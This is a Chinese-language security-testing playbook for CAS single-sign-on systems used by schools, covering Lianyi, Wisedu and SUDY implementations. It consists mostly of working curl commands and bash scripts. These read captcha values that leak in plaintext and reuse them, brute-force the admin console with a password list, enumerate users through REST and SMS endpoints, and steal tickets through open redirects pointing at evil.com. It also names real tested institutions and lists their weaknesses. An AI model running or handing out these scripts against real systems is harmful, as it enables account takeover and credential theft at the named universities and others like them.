# CAS (Central Authentication Service) 漏洞测试模式

## 目的
教育机构广泛使用CAS统一身份认证系统。本文档记录CAS系统的常见漏洞模式和测试方法。

## CAS系统指纹识别

### 常见CAS实现
| 指纹 | 供应商 | 特征 |
|------|--------|------|
| lyuapServer | 联奕科技(Lianyi) | 路径: /lyuapServer/login, 版权: Copyright 2004-2017 LIANYI TECHNOLOGY CO.,LTD. |
| ly_web_casconsole | 联奕科技(Lianyi) | 管理控制台: /ly_web_casconsole/system/login!login.action |
| ycServer | 金智教育 | CAS SSO |
| login-wisedu_v1.0.js | 金智教育 | JS文件名，含pwdDefaultEncryptSalt |
| CacheTicketRegistry | 金智教育 | com.wisedu.authserver.ticket.registry |
| SWUI / sw-ui | 树维信息 | CAS/一站式服务大厅 |
| CAS 5.x | Apereo | 开源CAS |

### 金智教育CAS专项测试
见 `references/wisedu-cas-testing-patterns.md` — 金智CAS完整漏洞测试模式：密钥泄露、会话固定、Status端点信息泄露、service参数白名单校验。含指纹命令和报告模板。
| CAS 5.x | Apereo | 开源CAS |

### 联奕科技CAS指纹命令
```bash
# 检测lyuapServer (联奕科技统一身份认证平台)
curl -sk 'https://<target>/lyuapServer/login' | head -20
# 特征: title含"统一身份认证平台", 引用lyuapServer/js/cas.js, RSA加密

# 检测ly_web_casconsole (联奕CAS管理后台)
curl -sk 'https://<target>/ly_web_casconsole/system/login!login.action'
# 特征: title含"统一身份认证管理平台", 版权: Copyright 2004-2017 LIANYI TECHNOLOGY CO.,LTD.

# 检测技术栈(从堆栈泄露)
curl -sk 'https://<target>/ly_web_casconsole/system/login!logincheck.action' \
  -X POST -d 'myusername=admin&password=123456&captcha=1234'
```

## 高危漏洞模式

### 1. 验证码明文泄露
**特征**: getyzm.action返回JSON包含rand字段
```bash
# 测试
curl -s 'https://<target>/ly_web_casconsole/system/login!getyzm.action' | grep -oP '"rand":"\K[^"]+'
# 返回: "6198" (验证码明文)
```
**危害**: 结合无账号锁定，可暴力破解管理后台

### 2. 客户端验证码校验
**特征**: 密码找回页面JS直接比对验证码值
```bash
# 分析JS逻辑
curl -sk 'https://<target>/safe/findPassByOther.jsp' | grep -A10 'function getcode1'
# 关键: if ((yan.toLocaleLowerCase().trim()+"") != (message.trim()+""))

# 验证码接口返回明文
curl -sk 'https://<target>/safe/yanzhengma.jsp?0.123456'
# 返回: 3847 (4位数字)
```
**绕过方法**: 直接调用后端接口，跳过客户端验证码检查

### 3. 无账号锁定机制
**特征**: 连续多次失败登录不触发锁定
```bash
# 测试脚本
for i in $(seq 1 20); do
  RAND=$(curl -s -c /tmp/cas_${i}.txt 'https://<target>/ly_web_casconsole/system/login!getyzm.action' | grep -oP '"rand":"\K[^"]+')
  curl -sk -b /tmp/cas_${i}.txt 'https://<target>/ly_web_casconsole/system/login!logincheck.action' \
    -X POST -d "myusername=admin&password=test${i}&captcha=${RAND}" 2>/dev/null | grep -oP '"message":"[^"]*"'
done
# 如果全部返回"填写正确的帐号密码"而无锁定提示，则存在漏洞
```

### 4. 特定密码触发堆栈泄露
**特征**: 密码123456/1234/111111触发HTML错误页
```bash
# 测试
RAND=$(curl -s -c /tmp/cas.txt 'https://<target>/ly_web_casconsole/system/login!getyzm.action' | grep -oP '"rand":"\K[^"]+')
curl -sk -b /tmp/cas.txt 'https://<target>/ly_web_casconsole/system/login!logincheck.action' \
  -X POST -d "myusername=admin&password=123456&captcha=${RAND}" | grep -oP '<title>[^<]*'
# 返回: "出错了！！" (堆栈泄露)
# 正常密码返回JSON: {"result":{"message":"填写正确的帐号密码"}}
```

### 5. CAS开放重定向
**特征**: service参数未校验，可注入任意URL
```bash
# 测试
curl -sk 'https://<target>/lyuapServer/login?service=https://evil.com/steal-ticket' | grep -oP 'action="[^"]*"'
# 返回: action="/lyuapServer/login;jsessionid=xxx?service=https://evil.com/steal-ticket"
```
**危害**: 登录后Ticket发送到攻击者服务器

**扩展测试** (2026-06 xjjtxy.cn 实测):
```bash
# service参数接受任意域名 (无白名单)
curl -sk 'https://<target>/lyuapServer/login?service=https://evil.com/steal' | grep 'action='
# 返回: action="/lyuapServer/login;jsessionid=XXX?service=https://evil.com/steal"

# callback参数也接受任意URL
curl -sk 'https://<target>/lyuapServer/login?callback=https://evil.com' | grep 'action='

# redirect_uri参数也接受任意URL
curl -sk 'https://<target>/lyuapServer/login?redirect_uri=https://evil.com' | grep 'action='
```

### 5b. 联奕CAS SMS用户枚举 (lyuapServer)
**特征**: /lyuapServer/MsmInfo 端点对已绑定/未绑定手机号返回不同状态码
```bash
# 通过浏览器AJAX测试(需要有效session)
# JS源码中的状态码定义:
# 0 = 错误, 1 = 成功(手机号已绑定), 2 = 间隔过小(90秒内), 3 = "手机号不存在或未绑定！"

# 从登录页JS提取SMS逻辑
curl -sk 'https://<target>/lyuapServer/login' | grep -A30 '发送短信请求'

# SMS端点
curl -sk 'https://<target>/lyuapServer/MsmInfo' -X POST \
  -H 'X-Requested-With: XMLHttpRequest' \
  -d 'phonenumber=13800138000&phonecode=<captcha>'
# 返回: "3" = 未绑定, "1" = 已绑定, "2" = 已发送(已绑定+频率限制)
```
**要点**:
- 需要有效session和phonecode(验证码图片)
- 状态码"3"明确表示手机号未注册
- 可批量枚举已绑定手机号的用户
- 登录页切换到短信登录模式才能看到相关UI

### 5c. 联奕CAS内部主机名泄露 (LT Token)
**特征**: LT token格式包含内部CAS服务器主机名
```bash
curl -sk 'https://<target>/lyuapServer/login' | grep -oP 'name="lt" value="\K[^"]+'
# 返回: LT-59615-f701JDN5N9oyoPpZptE1gofz9OR3KW-cas01.example.org
# 泄露: 内部主机名 cas01.example.org
```

### 5d. 联奕CAS密码找回页面信息泄露
**特征**: /safe/findPassByOther.jsp 暴露完整组织架构
```bash
# 获取学院/部门列表
curl -sk 'https://<target>/safe/findPassByOther.jsp' | grep -oP 'option[^>]*>[^<]+'
# 密码找回需要: 登录账号 + 姓名 + 身份证号 + 学院名称
```

### 5e. 联奕CAS源码硬编码敏感信息
**特征**: 登录页源码中包含内网IP、内部域名、内部工具地址
```bash
# 提取所有URL
curl -sk 'https://<target>/lyuapServer/login' | grep -oP 'https?://[^\s"<>]+' | sort -u
# 常见泄露: 内网IP(172.16.x.x:port), 内部域名(cas.leaf.com), CoCall即时通讯端口
```

### 5f. 联奕CAS管理后台暴力破解
**特征**: /ly_web_casconsole 管理后台验证码为客户端校验
```bash
# 获取验证码(rand值可直接使用)
RAND=$(curl -s -c /tmp/cas.txt 'https://<target>/ly_web_casconsole/system/login!getyzm.action' | grep -oP '"rand":"\K[^"]+')

# 登录
curl -sk -b /tmp/cas.txt 'https://<target>/ly_web_casconsole/system/login!logincheck.action' \
  -X POST -d "myusername=admin&password=test&captcha=${RAND}"

# 错误消息差异(可能存在用户枚举):
# "填写正确的帐号密码" = 通用错误(多数密码)
# "用户名或密码错误!" = 不同错误(少数密码如abc123/888888)
# "填写验证码！" = 验证码校验失败(服务端也有校验)
```

### 5g. RSA公钥泄露 (lyuapServer)
**特征**: 登录页JS中硬编码RSA公钥，用于密码加密
```bash
# 提取RSA公钥
curl -sk 'https://<target>/lyuapServer/login' | grep -oP 'RSAKeyPair\("[^"]*",\s*'"'"'[^'"'"']*'"'"',\s*"([^"]*)"\)'
# 返回: RSAKeyPair("010001", '', "00f0d1b6305ea625...")
```
**要点**:
- RSA公钥泄露本身不构成漏洞(非对称加密公钥可公开)
- 但确认密码使用RSA加密，需配合CAS端点测试
- 若私钥泄露可解密所有截获的密码

### 5c. JSESSIONID URL泄露 (lyuapServer)
**特征**: CAS登录表单action中包含jsessionid
```bash
curl -sk 'https://<target>/lyuapServer/login' | grep -oP 'jsessionid=[A-F0-9]+'
# 返回: jsessionid=67B2AC1E9E47958B352CD002A643B477
```
**危害**: JSESSIONID出现在URL中，可通过Referer头、浏览器历史、服务器日志泄露

### 5d. lyuapServer Spring Boot Actuator端点
**特征**: Actuator端点返回302重定向到登录页(非404)
```bash
# 检测Actuator端点 (返回302说明端点存在但需认证)
for ep in actuator/env health info metrics beans configprops mappings trace heapdump threaddump logfile shutdown druid v2/api-docs; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' "https://<target>/lyuapServer/${ep}")
  echo "$ep: $code"
done
# 302 = 端点存在但重定向到登录页
# 404 = 端点不存在
```
**要点**:
- 302重定向说明Spring Boot Actuator已启用，只是需要认证
- 若CAS认证被绕过，这些端点可泄露环境变量、配置、堆转储等
- /heapdump端点可能返回内存转储(包含密码、token等)

### 6. 密保问题校验逻辑缺陷
**特征**: checkquestionbinding对所有用户返回true
```bash
# 测试
curl -sk 'https://<target>/safe/checkquestionbinding.jsp' -X POST -d 'account=admin'
curl -sk 'https://<target>/safe/checkquestionbinding.jsp' -X POST -d 'account=nonexistentuser12345'
# 如果都返回true，则存在逻辑缺陷
```

### 7. QR Code登录钓鱼
**特征**: QR Code生成接口可任意调用
```bash
# 获取QR Code和UUID
curl -sk 'https://<target>/lyuapServer/QrCodeServlet?cmd=getQr'
# 返回: {"uuid":"xxx","content":"base64..."}

# 轮询扫码状态
curl -sk 'https://<target>/lyuapServer/CheckScan?uuidQr=<uuid>'
```

## 密码重置流程分析

### 标准流程
1. findPassByOther.jsp - 输入账号、姓名、身份证
2. yanzhengma.jsp - 获取验证码
3. checkaccountmassage.jsp - 验证账号信息
4. checkquestionbinding.jsp - 检查密保问题
5. changepwdbyquestion.jsp - 回答密保问题
6. changepwd.jsp - 设置新密码

### 关键接口
```bash
# 验证码获取(返回明文)
curl -sk 'https://<target>/safe/yanzhengma.jsp?0.123456'

# 账号信息验证
curl -sk 'https://<target>/safe/checkaccountmassage.jsp' -X POST \
  -d 'account=admin&xm=test&myname=110101200001010011'

# 密保问题检查
curl -sk 'https://<target>/safe/checkquestionbinding.jsp' -X POST -d 'account=admin'

# 密码修改页面(可能无需认证)
curl -sk 'https://<target>/safe/changepwd.jsp'
```

## 自动化爆破脚本模板

```bash
#!/bin/bash
# CAS管理后台暴力破解(利用验证码明文泄露+无账号锁定)
TARGET="https://<target>/ly_web_casconsole/system/login!logincheck.action"
CAPTCHA_URL="https://<target>/ly_web_casconsole/system/login!getyzm.action"
USER="admin"

for PASS in "123456" "admin" "admin123" "password" "xjjt123" "Xjjt@123"; do
  RAND=$(curl -s -c /tmp/cas_brute_${RANDOM}.txt "$CAPTCHA_URL" 2>/dev/null | grep -oP '"rand":"\K[^"]+')
  RESP=$(curl -sk -b /tmp/cas_brute_${RANDOM}.txt "$TARGET" -X POST \
    -d "myusername=${USER}&password=${PASS}&captcha=${RAND}" 2>/dev/null)
  if echo "$RESP" | grep -q '"success":true'; then
    echo "[!!!] 成功! 用户: ${USER} 密码: ${PASS}"
    break
  fi
done
```

## 报告模板

```
标题: <学校名称>CAS统一身份认证平台<漏洞名称>
域名: <域名>
类型: <类型>
等级: 高危/中危/低危
行业: 教育
地址: <省份><城市><区>
URL: <完整URL>

详情: <漏洞描述>

复现:
1. <步骤1>
curl -sk '<URL>'

2. <步骤2>
...

影响: <危害描述>

修复建议:
1. <建议1>
2. <建议2>
```

## SUDY (树维) CAS 漏洞模式

### 指纹识别
- 登录页路径: `/sso/login`
- 主题目录: `/sso/themes/sudy_njsj/`
- JS文件: `/sso/js/cas.js`, `/sso/js/security.js` (RSA加密)
- 表单字段: `username`, `password`, `authcode`(验证码), `execution`(加密token), `encrypted=true`, `rememberMe`
- 验证码图片: `/sso/captcha.jpg`
- CSRF: `<meta name="_csrf" content=""/>` (可能为空)

### 1. REST API 用户名枚举 (中危)
**特征**: `/sso/v1/tickets` 端点对存在/不存在用户返回不同错误
```bash
# 存在的用户 → FailedLoginException
curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=wrongpass' 'http://sso.<target>/sso/v1/tickets'
# 返回: {"authentication_exceptions": ["FailedLoginException"]}

# 不存在的用户 → AccountNotFoundException
curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=nonexistentuser12345&password=wrongpass' 'http://sso.<target>/sso/v1/tickets'
# 返回: {"authentication_exceptions": ["AccountNotFoundException"]}
```
**要点**:
- REST API无验证码保护，可直接枚举
- 账号锁定阈值: 3次失败后返回 `LoginLockException`
- 可在锁定前每次测试1-2个用户名，控制频率批量枚举
- 常见存在用户: admin, test, guest

### 2. CAS Service Validation 信息泄露
**特征**: serviceValidate返回详细错误，泄露service registry信息
```bash
curl -sk 'http://sso.<target>/sso/serviceValidate?service=https://evil.com&ticket=ST-fake'
# 返回: "Service [https://evil.com] is not found in service registry."
```
**可探测端点**: `/sso/serviceValidate`, `/sso/proxyValidate`, `/sso/p3/serviceValidate`

### 3. OAuth回调内部IP泄露
**特征**: 登录页QQ/微博OAuth回调URL硬编码内网IP
```bash
curl -sk 'http://sso.<target>/sso/login' | grep -oP 'http%3A%2F%2F[0-9.]+:[0-9]+'
# 解码后: http://172.x.x.x:8060/cas/qq/authlogin
```

### 4. HTTPS→HTTP降级
**特征**: nginx配置将HTTPS 301到HTTP，导致凭据明文传输
```bash
curl -sk -I 'https://sso.<target>/sso/login' | grep -i location
# 返回: Location: http://sso.<target>/sso/login
```

### 5. /sso/status 泄露Spring Security框架
**特征**: status端点返回401时泄露框架内部类名
```bash
curl -sk 'http://sso.<target>/sso/status' | grep -i 'AbstractAccessDecisionManager'
# 返回: <p>AbstractAccessDecisionManager.accessDenied</p>
```
**危害**: 确认Spring Security框架，辅助针对性攻击

### 6. CSRF Token为空
**特征**: 登录页面的CSRF元标签内容为空字符串
```bash
curl -sk 'http://sso.<target>/sso/login' | grep '_csrf'
# 返回: <meta name="_csrf" content=""/>
#        <meta name="_csrf_header" content=""/>
```
**危害**: CSRF保护可能未生效，可构造恶意登录页面

### 7. SUDY IDS 密码找回系统信息泄露
**特征**: imp子域运行SUDY IDS密码找回系统，多个API无需认证
```bash
# 安全问题列表(无需认证)
curl -sk 'http://imp.<target>/_web/_apps/ids/user/passQuestion.json?domainId=1'
# 返回: [{"id":"我最喜欢的歌曲？","text":"我最喜欢的歌曲？"}, ...]

# 密码找回配置(需Referer但无认证)
curl -sk 'http://imp.<target>/_web/_apps/ids/api/passwordRecovery/config.rst?domainId=1'

# 错误页面泄露内部IP
curl -sk 'http://imp.<target>/_web/_apps/ids/api/passwordRecovery/new.rst' | grep 'value='
# 返回: <input type="hidden" id="clientIp" value="169.254.64.19" />
#        <input type="hidden" id="x_forwarded_for" value="210.28.92.31" />

# 验证码图片(无需认证)
curl -sk -o /dev/null -w '%{http_code}' 'http://imp.<target>/_control/validateimage'
```
**子域**: 通常为 `imp.<domain>` 或 `ids.<domain>`
**技术栈**: Tengine + Tomcat 8.5.x + jQuery EasyUI
**危害**: 泄露密保问题列表、内部IP、密码找回配置

### SUDY CAS 自动化枚举脚本
```bash
#!/bin/bash
# SUDY CAS REST API用户名枚举
SSO_URL="http://sso.<target>/sso/v1/tickets"
USERS="admin test guest student teacher user root system info"

for USER in $USERS; do
  RESP=$(curl -sk --max-time 3 -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -d "username=${USER}&password=test123" "$SSO_URL" 2>/dev/null)
  if echo "$RESP" | grep -q "AccountNotFoundException"; then
    echo "$USER -> 不存在"
  elif echo "$RESP" | grep -q "FailedLoginException"; then
    echo "$USER -> 存在"
  elif echo "$RESP" | grep -q "LoginLockException"; then
    echo "$USER -> 已锁定"
  fi
  sleep 1  # 避免触发频率限制
done
```

### 已测试SUDY CAS目标
| 目标 | 发现 | 备注 |
|------|------|------|
| nau.edu.cn | REST API用户名枚举+内部IP泄露+HTTPS降级+status框架泄露+空CSRF+IDS密码找回信息泄露 | nginx/1.22.0, 3次锁定, imp子域运行SUDY IDS |

## 已测试目标

| 目标 | 发现漏洞 | 技术栈 |
|------|---------|--------|
| xjjtedu.com | 11个(高1/中6/低4) | 蓝盾CAS+Tomcat7+Shiro+CoCall |
| xjjtxy.cn | CAS Open Redirect+管理后台暴露+源码信息泄露(LT Token内网IP/内部域名)+SMS用户枚举+CoCall公网暴露 | 联奕CAS(lyuapServer)+Liferay Portal+Tomcat 7.0.109(EOL)+IIS/6.6666666666 |
| xjjtxy.top | BPM系统事务中心(Vue.js+Java+OAuth2) | Nginx+BPM REST API |
| xjjtedu.cn | CoCall V6.2.2.16公网暴露+Artery UI+Vue.js 2.6.11 | Spring Boot+Artery UI |

## 注意事项

1. 验证码明文泄露+无账号锁定 = 高危组合，可暴力破解
2. 开放重定向可窃取全校师生CAS Ticket
3. 客户端验证码校验可绕过密码找回保护
4. 特定密码(123456等)可能触发堆栈泄露
5. 密保问题校验可能对所有用户返回true
6. SUDY CAS: `/sso/v1/tickets` REST API无验证码，3次锁定前可枚举用户名
7. SUDY CAS: 登录页可能泄露内网IP(OAuth回调URL中硬编码)
8. CAS系统HTTPS→HTTP降级是常见配置错误，检查Location头
